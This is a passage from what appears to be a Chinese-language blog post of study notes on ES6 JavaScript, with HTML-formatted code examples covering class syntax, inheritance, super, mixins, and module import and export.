&#125; </span><br><span class="line">  set x(value) &#123; </span><br><span class="line">    #x = +value</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="this-的指向"><a href="#this-的指向" class="headerlink" title="this 的指向"></a>this 的指向</h3><p>类的方法内部如果含有 this ，它默认指向类的实例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Logger &#123; </span><br><span class="line">  printName(name = &apos;there&apos;) &#123; </span><br><span class="line">    this.print(`Hello $&#123;name&#125;`); </span><br><span class="line">  &#125;</span><br><span class="line">  print(text) &#123; </span><br><span class="line">    console.log(text); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">const logger = new Logger(); </span><br><span class="line">const &#123; printName &#125; = logger; </span><br><span class="line">printName(); </span><br><span class="line">// TypeError: Cannot read property &apos;print&apos; of undef ined</span><br></pre></td></tr></table></figure></p><h3 id="Class-的取值函数（getter）和存值函数（setter）"><a href="#Class-的取值函数（getter）和存值函数（setter）" class="headerlink" title="Class 的取值函数（getter）和存值函数（setter）"></a>Class 的取值函数（getter）和存值函数（setter）</h3><p>在“类”的内部可以使用 get 和 set 关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    // ... </span><br><span class="line">  &#125;</span><br><span class="line">  get prop() &#123; </span><br><span class="line">    return &apos;getter&apos;; </span><br><span class="line">  &#125;</span><br><span class="line">  set prop(value) &#123; </span><br><span class="line">    console.log(&apos;setter: &apos;+value); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let inst = new MyClass(); </span><br><span class="line">inst.prop = 123; </span><br><span class="line">// setter: 123 </span><br><span class="line">inst.prop </span><br><span class="line">// &apos;getter&apos;</span><br></pre></td></tr></table></figure></p><h3 id="Class-的-Generator-方法"><a href="#Class-的-Generator-方法" class="headerlink" title="Class 的 Generator 方法"></a>Class 的 Generator 方法</h3><p>如果某个方法之前加上星号（ * ），就表示该方法是一个 Generator 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  constructor(...args) &#123; </span><br><span class="line">    this.args = args; </span><br><span class="line">  &#125;</span><br><span class="line">  * [Symbol.iterator]() &#123; </span><br><span class="line">    for (let arg of this.args) &#123; </span><br><span class="line">      yield arg; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let x of new Foo(&apos;hello&apos;, &apos;world&apos;)) &#123; </span><br><span class="line">  console.log(x); </span><br><span class="line">&#125;</span><br><span class="line">// hello </span><br><span class="line">// world</span><br></pre></td></tr></table></figure></p><h3 id="Class-的静态方法"><a href="#Class-的静态方法" class="headerlink" title="Class 的静态方法"></a>Class 的静态方法</h3><ul><li>如果在一个方法前，加上 static 关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  static classMethod() &#123; </span><br><span class="line">    return &apos;hello&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">Foo.classMethod() // &apos;hello&apos; </span><br><span class="line">var foo = new Foo(); </span><br><span class="line">foo.classMethod() </span><br><span class="line">// TypeError: foo.classMethod is not a function</span><br></pre></td></tr></table></figure><ul><li>如果静态方法包含 this 关键字，这个 this 指的是类，而不是实例。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  static bar () &#123; </span><br><span class="line">    this.baz(); </span><br><span class="line">  &#125;</span><br><span class="line">  static baz () &#123; </span><br><span class="line">    console.log(&apos;hello&apos;); </span><br><span class="line">  &#125;</span><br><span class="line">  baz () &#123; </span><br><span class="line">    console.log(&apos;world&apos;); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">Foo.bar() // hello</span><br></pre></td></tr></table></figure><ul><li>父类的静态方法，可以被子类继承，也可以从 super 对象上调用。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  static classMethod() &#123; </span><br><span class="line">    return &apos;hello&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Bar extends Foo &#123; &#125;</span><br><span class="line">Bar.classMethod() // &apos;hello&apos;</span><br><span class="line"></span><br><span class="line">//或</span><br><span class="line">class Bar extends Foo &#123; </span><br><span class="line">  static classMethod() &#123; </span><br><span class="line">    return super.classMethod() + &apos;, too&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">Bar.classMethod() // &quot;hello, too&quot;</span><br></pre></td></tr></table></figure><h3 id="Class-的静态属性和实例属性"><a href="#Class-的静态属性和实例属性" class="headerlink" title="Class 的静态属性和实例属性"></a>Class 的静态属性和实例属性</h3><p>静态属性指的是 Class 本身的属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; &#125;</span><br><span class="line">Foo.prop = 1; </span><br><span class="line">Foo.prop // 1</span><br></pre></td></tr></table></figure></p><h4 id="类的实例属性"><a href="#类的实例属性" class="headerlink" title="类的实例属性"></a>类的实例属性</h4><p>类的实例属性可以用等式，写入类的定义之中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123; </span><br><span class="line">  myProp = 42; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    console.log(this.myProp); // 42 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="类的静态属性"><a href="#类的静态属性" class="headerlink" title="类的静态属性"></a>类的静态属性</h4><p>类的静态属性只要在上面的实例属性写法前面，加上 static 关键字就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123; </span><br><span class="line">  static myStaticProp = 42; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    console.log(MyClass.myStaticProp); // 42 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="new-target属性"><a href="#new-target属性" class="headerlink" title="new.target属性"></a>new.target属性</h3><ul><li>该属性一般用在构造函数之中，返回 new 命令作用于的那个构造函数。如果构造函数不是通过 new 命令调用的， new.target 会返回 undefined ，因此这个属性可以用来确定构造函数是怎么调用的。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Person(name) &#123; </span><br><span class="line">  if (new.target === Person) &#123; </span><br><span class="line">    this.name = name; </span><br><span class="line">  &#125; else &#123; </span><br><span class="line">    throw new Error(&apos;必须使用 new 生成实例&apos;); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var person = new Person(&apos;张三&apos;); // 正确 </span><br><span class="line">var notAPerson = Person.call(person, &apos;张三&apos;); // 报错</span><br></pre></td></tr></table></figure><ul><li>子类继承父类时， new.target 会返回子类。</li><li>在函数外部，使用 new.target 会报错。</li></ul><h2 id="Class-的继承"><a href="#Class-的继承" class="headerlink" title="Class 的继承"></a>Class 的继承</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>子类必须在 constructor 方法中调用 super 方法，否则新建实例时会报错。这是因为子类没有自己的 this 对象，而是继承父类的 this 对象，然后对其进行加工。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; /* ... */ &#125; </span><br><span class="line">class ColorPoint extends Point &#123; </span><br><span class="line">  constructor() &#123; &#125; </span><br><span class="line">&#125;</span><br><span class="line">let cp = new ColorPoint(); // ReferenceError</span><br></pre></td></tr></table></figure><ul><li>如果子类没有定义 constructor 方法，这个方法会被默认添加。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class ColorPoint extends Point &#123; &#125;</span><br><span class="line">// 等同于 </span><br><span class="line">class ColorPoint extends Point &#123; </span><br><span class="line">  constructor(...args) &#123; </span><br><span class="line">    super(...args); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Object-getPrototypeOf"><a href="#Object-getPrototypeOf" class="headerlink" title="Object.getPrototypeOf()"></a>Object.getPrototypeOf()</h3><p>Object.getPrototypeOf 方法可以用来从子类上获取父类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.getPrototypeOf(ColorPoint) === Point </span><br><span class="line">// true</span><br></pre></td></tr></table></figure></p><h3 id="super-关键字"><a href="#super-关键字" class="headerlink" title="super 关键字"></a>super 关键字</h3><p>super 这个关键字，既可以当作函数使用，也可以当作对象使用。</p><h4 id="super-作为函数调用"><a href="#super-作为函数调用" class="headerlink" title="super 作为函数调用"></a>super 作为函数调用</h4><p>super 作为函数调用时，代表父类的构造函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125; class B extends A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    super(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>作为函数时， super() 只能用在子类的构造函数之中，用在其他地方就会报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125; class B extends A &#123; </span><br><span class="line">  m() &#123; </span><br><span class="line">    super(); </span><br><span class="line">    // 报错 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="super-作为对象时"><a href="#super-作为对象时" class="headerlink" title="super 作为对象时"></a>super 作为对象时</h4><p>super 作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; </span><br><span class="line">  p() &#123; </span><br><span class="line">    return 2; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    super(); </span><br><span class="line">    console.log(super.p()); // 2 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let b = new B();</span><br></pre></td></tr></table></figure></p><p>由于 super 指向父类的原型对象，所以定义在父类实例上的方法或属性，是无法通过 super 调用的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    this.p = 2; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123; </span><br><span class="line">  get m() &#123; </span><br><span class="line">    return super.p; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let b = new B(); </span><br><span class="line">b.m // undefined</span><br></pre></td></tr></table></figure></p><p>通过 super 调用父类的方法时， super 会绑定子类的 this 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    this.x = 1; </span><br><span class="line">  &#125;</span><br><span class="line">  print() &#123; </span><br><span class="line">    console.log(this.x); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    super(); </span><br><span class="line">    this.x = 2; </span><br><span class="line">  &#125;</span><br><span class="line">  m() &#123; </span><br><span class="line">    super.print(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let b = new B(); </span><br><span class="line">b.m() // 2</span><br></pre></td></tr></table></figure></p><h3 id="类的-prototype-属性和proto属性"><a href="#类的-prototype-属性和proto属性" class="headerlink" title="类的 prototype 属性和proto属性"></a>类的 prototype 属性和<strong>proto</strong>属性</h3><ul><li>子类的 <strong>proto</strong> 属性，表示构造函数的继承，总是指向父类。 </li><li>子类 prototype 属性的 <strong>proto</strong> 属性，表示方法的继承，总是指向父类的 prototype 属性。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; &#125;</span><br><span class="line">class B extends A &#123; &#125;</span><br><span class="line">B.__proto__ === A // true </span><br><span class="line">B.prototype.__proto__ === A.prototype // true</span><br></pre></td></tr></table></figure><h3 id="原生构造函数的继承"><a href="#原生构造函数的继承" class="headerlink" title="原生构造函数的继承"></a>原生构造函数的继承</h3><p>ECMAScript 的原生构造函数大致有下面这些。</p><ul><li>Boolean()</li><li>Number()</li><li>String() </li><li>Array() </li><li>Date() </li><li>Function() </li><li>RegExp() </li><li>Error() </li><li>Object()</li></ul><p>ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象 this ，然后再用子类的构造函数修饰 this ，使得父类的所有行为都可以继承。下面是一个继承 Array 的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class MyArray extends Array &#123; </span><br><span class="line">  constructor(...args) &#123; </span><br><span class="line">    super(...args); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var arr = new MyArray(); </span><br><span class="line">arr[0] = 12; </span><br><span class="line">arr.length // 1 </span><br><span class="line">arr.length = 0; </span><br><span class="line">arr[0] // undefined</span><br></pre></td></tr></table></figure></p><h3 id="Mixin-模式的实现"><a href="#Mixin-模式的实现" class="headerlink" title="Mixin 模式的实现"></a>Mixin 模式的实现</h3><p>Mixin 模式指的是，将多个类的接口“混入”（mixin）另一个类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function mix(...mixins) &#123; </span><br><span class="line">  class Mix &#123;&#125; </span><br><span class="line">  for (let mixin of mixins) &#123; </span><br><span class="line">    copyProperties(Mix, mixin); </span><br><span class="line">    copyProperties(Mix.prototype, mixin.prototype); </span><br><span class="line">  &#125;</span><br><span class="line">  return Mix; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copyProperties(target, source) &#123; </span><br><span class="line">  for (let key of Reflect.ownKeys(source)) &#123; </span><br><span class="line">    if ( key !== &quot;constructor&quot; &amp;&amp; key !== &quot;prototype&quot; &amp;&amp; key !== &quot;name&quot; ) &#123;</span><br><span class="line">      let desc = Object.getOwnPropertyDescriptor(source, key); </span><br><span class="line">      Object.defineProperty(target, key, desc); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//使用</span><br><span class="line">class DistributedEdit extends mix(Loggable, Serializable) &#123;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Module-的语法"><a href="#Module-的语法" class="headerlink" title="Module 的语法"></a>Module 的语法</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>ES6 模块不是对象，而是通过 export 命令显式指定输出的代码，再通过 import 命令输入。</p><p>ES6 模块还有以下好处。</p><ul><li>不再需要 UMD 模块格式了，将来服务器和浏览器都会支持 ES6 模块格式。目前，通过各种工具库，其实已经做到了这一点。 </li><li>将来浏览器的新 API 就能用模块格式提供，不再必须做成全局变量或 者 navigator 对象的属性。 </li><li>不再需要对象作为命名空间（比如 Math 对象），未来这些功能可以通过模块提供。</li></ul><h3 id="export-命令"><a href="#export-命令" class="headerlink" title="export 命令"></a>export 命令</h3><p>如果你希望外部能够读取模块内部的某个变量，就必须使用 export 关键字输出该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// profile.js </span><br><span class="line">export var firstName = &apos;Michael&apos;; </span><br><span class="line">export var lastName = &apos;Jackson&apos;; </span><br><span class="line">export var year = 1958;</span><br><span class="line"></span><br><span class="line">//or</span><br><span class="line">var firstName = &apos;Michael&apos;; </span><br><span class="line">var lastName = &apos;Jackson&apos;; </span><br><span class="line">var year = 1958; </span><br><span class="line">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure></p><p>export 命令除了输出变量，还可以输出函数或类（class）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function multiply(x, y) &#123; </span><br><span class="line">  return x * y; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>通常情况下， export 输出的变量就是本来的名字，但是可以使用 as 关键字重命名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function v1() &#123; ... &#125; </span><br><span class="line">function v2() &#123; ... &#125; </span><br><span class="line">export &#123; </span><br><span class="line">  v1 as streamV1, </span><br><span class="line">  v2 as streamV2, </span><br><span class="line">  v2 as streamLatestVersion </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>export 语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export var foo = &apos;bar&apos;; </span><br><span class="line">setTimeout(() =&gt; foo = &apos;baz&apos;, 500);</span><br></pre></td></tr></table></figure></p><h3 id="import-命令"><a href="#import-命令" class="headerlink" title="import 命令"></a>import 命令</h3><ul><li>如果想为输入的变量重新取一个名字， import 命令要使用 as 关键字，将输入的变量重命名。</li><li>import 命令接受一对大括号，里面指定要从其他模块导入的变量名。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; lastName as surname &#125; from &apos;./profile&apos;;</span><br></pre></td></tr></table></figure><ul><li>import 命令具有提升效果，会提升到整个模块的头部，首先执行。</li><li>由于 import 是静态执行，所以不能使用表达式和变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 报错 </span><br><span class="line">import &#123; &apos;f&apos; + &apos;oo&apos; &#125; from &apos;my_module&apos;; </span><br><span class="line"></span><br><span class="line">// 报错 </span><br><span class="line">let module = &apos;my_module&apos;; </span><br><span class="line">import &#123; foo &#125; from module; </span><br><span class="line"></span><br><span class="line">// 报错 </span><br><span class="line">if (x === 1) &#123; </span><br><span class="line">  import &#123; foo &#125; from &apos;module1&apos;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">  import &#123; foo &#125; from &apos;module2&apos;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果多次重复执行同一句 import 语句，那么只会执行一次，而不会执行多次。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &apos;lodash&apos;; </span><br><span class="line">import &apos;lodash&apos;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="模块的整体加载"><a href="#模块的整体加载" class="headerlink" title="模块的整体加载"></a>模块的整体加载</h3><p>用星号（ * ）指定一个对象，所有输出值都加载在这个对象上面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// circle.js </span><br><span class="line">export function area(radius) &#123; </span><br><span class="line">  return Math.PI * radius * radius; </span><br><span class="line">&#125;</span><br><span class="line">export function circumference(radius) &#123; </span><br><span class="line">  return 2 * Math.PI * radius; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// main.js</span><br><span class="line">import * as circle from &apos;./circle&apos;; </span><br><span class="line">console.log(&apos;圆面积：&apos; + circle.area(4)); </span><br><span class="line">console.log(&apos;圆周长：&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure></p><h3 id="export-default-命令"><a href="#export-default-命令" class="headerlink" title="export default 命令"></a>export default 命令</h3><ul><li>为模块指定默认输出，其他模块加载该模块时， import 命令可以为该匿名函数指定任意名字。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// export-default.js </span><br><span class="line">export default function () &#123; </span><br><span class="line">  console.log(&apos;foo&apos;); </span><br><span class="line">&#125;</span><br><span class="line">// import-default.js </span><br><span class="line">import customName from &apos;./export-default&apos;; </span><br><span class="line">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure><ul><li>一个模块只能有一个默认输出，因此 export default 命令只能使用一次。</li><li>export default 命令其实只是输出一个叫做 default 的变量，所以它后面不能跟变量声明语句。</li></ul><h3 id="export-与-import-的复合写法"><a href="#export-与-import-的复合写法" class="headerlink" title="export 与 import 的复合写法"></a>export 与 import 的复合写法</h3><p>如果在一个模块之中，先输入后输出同一个模块， import 语句可以与 export 语句写在一起。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export &#123; foo, bar &#125; from &apos;my_module&apos;;</span><br><span class="line">// 接口改名 </span><br><span class="line">export &#123; foo as myFoo &#125; from &apos;my_module&apos;; </span><br><span class="line">// 整体输出 </span><br><span class="line">export * from &apos;my_module&apos;;</span><br></pre></td></tr></table></figure></p><h3 id="模块的继承"><a href="#模块的继承" class="headerlink" title="模块的继承"></a>模块的继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// circleplus.js</span><br><span class="line">export * from &apos;circle&apos;; </span><br><span class="line">export var e = 2.71828182846; </span><br><span class="line">export default function(x) &#123; </span><br><span class="line">  return Math.exp(x); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// main.js </span><br><span class="line">import * as math from &apos;circleplus&apos;; </span><br><span class="line">import exp from &apos;circleplus&apos;; </span><br><span class="line">console.log(exp(math.e));</span><br></pre></td></tr></table></figure><h3 id="跨模块常量"><a href="#跨模块常量" class="headerlink" title="跨模块常量"></a>跨模块常量</h3><p>如果想设置跨模块的常量（即跨多个文件），或者说一个值要被多个模块共享，可以采用下面的写法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// constants.js 模块 </span><br><span class="line">export const A = 1; </span><br><span class="line">export const B = 3; </span><br><span class="line">export const C = 4; </span><br><span class="line"></span><br><span class="line">// test1.js 模块 </span><br><span class="line">import * as constants from &apos;./constants&apos;; </span><br><span class="line">console.log(constants.A); // 1 </span><br><span class="line">console.log(constants.B); // 3</span><br></pre></td></tr></table></figure></p><h3 id="import"><a href="#import" class="headerlink" title="import()"></a>import()</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul><li>require 是运行时加载模块， require 到底加载哪一个模块，只有运行时才知道。 import 语句做不到这一点。</li><li>import() 函数，完成动态加载。</li><li>import() 类似于 Node 的 require 方法，区别主要是前者是异步加载，后者是 同步加载。</li><li>import() 返回一个 Promise 对象。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const main = document.querySelector(&apos;main&apos;); </span><br><span class="line">import(`./section-modules/$&#123;someVariable&#125;.js`) </span><br><span class="line">  .then(module =&gt; &#123; </span><br><span class="line">    